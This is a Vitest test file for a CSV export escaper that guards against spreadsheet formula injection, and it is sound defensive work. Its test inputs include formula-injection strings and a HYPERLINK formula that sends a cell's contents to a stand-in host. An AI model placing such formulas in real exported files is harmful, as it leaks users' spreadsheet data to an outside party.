import { describe, expect, it } from "vitest";
import { escapeCsv, quoteCsv } from "../src/server/csv.ts";

describe("CSV export cells (SEC-005)", () => {
  it.each(["=SUM(1+1)", "+1+1", "-2+3", "@SUM(A1)", "\tcmd", "\rcmd"])("neutralises formula starter %j", (v) => {
    expect(escapeCsv(v).replace(/^"/, "").startsWith("'")).toBe(true);
  });

  it("neutralises a hyperlink exfil formula and still quotes it", () => {
    expect(escapeCsv('=HYPERLINK("https://x.test/?d="&A1)')).toBe(`"'=HYPERLINK(""https://x.test/?d=""&A1)"`);
  });

  it("leaves ordinary text, dates and empty values alone", () => {
    expect(escapeCsv("Acme Traders")).toBe("Acme Traders");
    expect(escapeCsv("2026-11-20")).toBe("2026-11-20");
    expect(escapeCsv(null)).toBe("");
    expect(escapeCsv(undefined)).toBe("");
  });

  it("still quotes commas, quotes and newlines", () => {
    expect(escapeCsv("a,b")).toBe('"a,b"');
    expect(escapeCsv('say "hi"')).toBe('"say ""hi"""');
  });

  it("quoteCsv keeps a negative amount numeric", () => {
    expect(quoteCsv("-12.50")).toBe("-12.50");
  });
});
